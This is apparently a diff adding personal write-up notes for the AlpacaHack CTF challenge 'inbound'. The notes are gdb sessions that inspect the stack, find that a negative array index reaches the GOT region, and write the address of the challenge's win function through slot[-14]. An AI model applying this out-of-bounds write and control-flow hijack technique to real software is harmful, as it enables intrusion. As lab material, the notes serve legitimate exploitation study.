@@ -1,0 +1,74 @@
+https://alpacahack.com/challenges/inbound
+
+## add breakpoint
+```
+b main
+```
+
+## check slot(0x55e6b4836040) and main.rip(0x7fec3ee131ca)
+```
+(gdb) p &(slot[0]) 
+$2 = (int *) 0x55e6b4836040 <slot
+```
+
+```
+(gdb) info frame 
+Stack level 0, frame at 0x7fffcae9ebc0:
+ rip = 0x55e6b4833250 in main (main.c:14); saved rip = 0x7fec3ee131ca
+ source language c++.
+ Arglist at 0x7fffcae9ebb0, args: 
+ Locals at 0x7fffcae9ebb0, Previous frame's sp is 0x7fffcae9ebc0
+ Saved registers:
+  rbp at 0x7fffcae9ebb0, rip at 0x7fffcae9ebb8
+```
+
+```
+(gdb) x/16x $rsp
+0x7fffcae9eb90: 0x00000000      0x00000000      0x3f021af0      0x00007fec
+0x7fffcae9eba0: 0xcae9ec90      0x00007fff      0xcae9ecd8      0x00007fff
+0x7fffcae9ebb0: 0xcae9ec50      0x00007fff      0x3ee131ca      0x00007fec <--- rip
+0x7fffcae9ebc0: 0xcae9ec00      0x00007fff      0xcae9ecd8      0x00007fff
+```
+
+## Seems overwriting return address is impossible because slot and rsp is too far.
+
+## Index can be minus. Check what exist around slot address.
+```
+(gdb) p &slot
+$2 = (int (*)[10]) 0x55fc02011040 <slot>
+
+(gdb) x/32xw 0x55fc02011000
+0x55fc02011000: 0x00000000      0x00000000      0x02011008      0x000055fc
+0x55fc02011010: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55fc02011020 <stdout@GLIBC_2.2.5>:    0xfeba25c0      0x00007fc8      0x00000000      0x00000000
+0x55fc02011030 <stdin@GLIBC_2.2.5>:     0xfeba18e0      0x00007fc8      0x00000000      0x00000000
+0x55fc02011040 <slot>:  0x00000000      0x00000000      0x00000000      0x00000000
+0x55fc02011050 <slot+16>:       0x00000000      0x00000000      0x00000000      0x00000000
+0x55fc02011060 <slot+32>:       0x00000000      0x00000000      0x00000000      0x00000000
+0x55fc02011070: 0x00000000      0x00000000      0x00000000      0x00000000
+```
+
+## check address of win -> 
+```
+p slot[-14] = 4198870(0x4011d6)
+
+
+(gdb) x/64xw 0x55fc02010fa0
+0x55fc02010fa0: 0x00000000      0x00000000      0xfea25bd0      0x00007fc8
+0x55fc02010fb0 <setbuf@got.plt>:        0xfea2d740      0x00007fc8      0xfe9fe0f0      0x00007fc8
+0x55fc02010fc0 <__isoc23_scanf@got.plt>:        0xfe9fda50      0x00007fc8      0xfea8cf30      0x00007fc8
+0x55fc02010fd0 <exit@got.plt>:  0xfe9e5b90      0x00007fc8      0xfe9c8200      0x00007fc8
+0x55fc02010fe0: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55fc02010ff0: 0x00000000      0x00000000      0xfe9e52b0      0x00007fc8
+0x55fc02011000: 0x00000000      0x00000000      0x004011d6      0x000055fc <---
+0x55fc02011010: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55fc02011020 <stdout@GLIBC_2.2.5>:    0xfeba25c0      0x00007fc8      0x00000000      0x00000000
+0x55fc02011030 <stdin@GLIBC_2.2.5>:     0xfeba18e0      0x00007fc8      0x00000000      0x00000000
+0x55fc02011040 <slot>:  0x00000000      0x00000000      0x00000000      0x00000000
+0x55fc02011050 <slot+16>:       0x00000000      0x00000000      0x00000000      0x00000000
+0x55fc02011060 <slot+32>:       0x00000000      0x00000000      0x00000000      0x00000000
+0x55fc02011070: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55fc02011080: 0x00000000      0x00000000      0x00000000      0x00000000
+0x55fc02011090: 0x00000000      0x00000000      0x00000000      0x00000000
+
+```
